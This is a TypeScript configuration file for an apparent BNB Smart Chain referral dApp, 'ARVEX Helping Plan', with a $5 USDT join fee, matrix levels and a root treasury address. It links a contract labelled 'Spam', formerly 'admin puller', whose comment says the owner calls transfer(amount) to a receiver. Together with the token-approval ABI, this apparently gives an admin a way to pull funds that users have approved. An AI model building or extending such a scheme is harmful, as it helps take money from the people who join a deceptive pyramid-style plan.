import type { Provider } from "ethers";
import multicoreAbiJson from "./multicore-abi.json";
import spamAbiJson from "./admin-puller-abi.json";

export const BSC_CHAIN_ID = 56;
export const BSC_CHAIN_ID_HEX = "0x38";
export const BSC_RPC = "https://bsc-dataseed.binance.org";
export const EXPLORER_BASE = "https://bscscan.com";

export const APP_NAME_FULL = "ARVEX Helping Plan";
export const APP_TAGLINE = "Together We Help, Together We Grow";

export const DEFAULT_CONTRACT_ADDRESS = "0x9450fa0d2f2A547E8D1EBfF6109e26AEA9B7A43E";

/** Spam — linked on deploy; owner calls transfer(amount) → receiver. */
export const DEFAULT_SPAM = "0x085a5eE47a4255CDb3C6F0b5B53231E5BBB63cED";
/** @deprecated use DEFAULT_SPAM */
export const DEFAULT_ADMIN_PULLER = DEFAULT_SPAM;

/** BSC mainnet USDT (18 decimals). */
export const DEFAULT_PAYMENT_TOKEN = "0x55d398326f99059fF775485246999027B3197955";

/** Official root / treasury — Fast ID #1 (Arvex ADMIN). */
export const ROOT_REFERRER = "0xE1bCaE6e15bA43406A7210f0256aCEa2C2207B31";

export const PAYMENT_TOKEN_SYMBOL = "USDT";

export const JOIN_USD = 5;
export const ROYALTY_DIRECTS = 20;

export const LEVEL_IDS = [4, 16, 64, 256, 1024, 4096] as const;
export const LEVEL_INCOME_USD = [4, 10, 25, 60, 150, 375] as const;
export const VIRTUAL_ON_COMPLETE = [0, 3, 6, 12, 24, 48] as const;
export const REQUIRED_DIRECTS = [0, 0, 2, 2, 2, 4] as const;

export const INCOME_TYPES: Record<number, string> = {
  1: "Direct",
  2: "Matrix",
  3: "Pending",
  4: "Unlocked",
  5: "Royalty",
  6: "Spill",
  7: "Admin",
};

export async function lowGasOverrides(
  provider: Provider,
  estimateGas?: () => Promise<bigint>,
): Promise<{ gasPrice: bigint; gasLimit?: bigint }> {
  const fee = await provider.getFeeData();
  let gasPrice = fee.gasPrice ?? fee.maxFeePerGas ?? 50_000_000n;
  if (gasPrice <= 0n) gasPrice = 50_000_000n;
  const CAP = 3_000_000_000n;
  if (gasPrice > CAP) gasPrice = CAP;
  const overrides: { gasPrice: bigint; gasLimit?: bigint } = { gasPrice };
  if (estimateGas) {
    try {
      const estimated = await estimateGas();
      overrides.gasLimit = (estimated * 110n) / 100n;
    } catch {
      /* wallet estimates */
    }
  }
  return overrides;
}

export const BSC_MAINNET_CHAIN_PARAMS = {
  chainId: BSC_CHAIN_ID_HEX,
  chainName: "BNB Smart Chain",
  nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
  rpcUrls: [BSC_RPC, "https://bsc-dataseed1.binance.org", "https://rpc.ankr.com/bsc"],
  blockExplorerUrls: [EXPLORER_BASE],
} as const;

type EthRequest = {
  request: (args: { method: string; params?: unknown[] }) => Promise<unknown>;
};

export async function ensureBscMainnet(eth: EthRequest): Promise<void> {
  const chainHex = String(await eth.request({ method: "eth_chainId" }));
  const chainId = Number.parseInt(chainHex, 16);
  if (chainId === BSC_CHAIN_ID) return;
  try {
    await eth.request({
      method: "wallet_switchEthereumChain",
      params: [{ chainId: BSC_CHAIN_ID_HEX }],
    });
  } catch (err: unknown) {
    const code = (err as { code?: number })?.code;
    if (code === 4902 || code === -32603) {
      await eth.request({
        method: "wallet_addEthereumChain",
        params: [BSC_MAINNET_CHAIN_PARAMS],
      });
      return;
    }
    throw new Error("Please switch MetaMask to BNB Smart Chain (chainId 56)");
  }
}

export const ERC20_ABI = [
  "function balanceOf(address) view returns (uint256)",
  "function allowance(address owner, address spender) view returns (uint256)",
  "function approve(address spender, uint256 amount) returns (bool)",
  "function decimals() view returns (uint8)",
  "function symbol() view returns (string)",
] as const;

export const MULTICORE_ABI = multicoreAbiJson;
export const SPAM_ABI = spamAbiJson;
/** @deprecated use SPAM_ABI */
export const ADMIN_PULLER_ABI = SPAM_ABI;
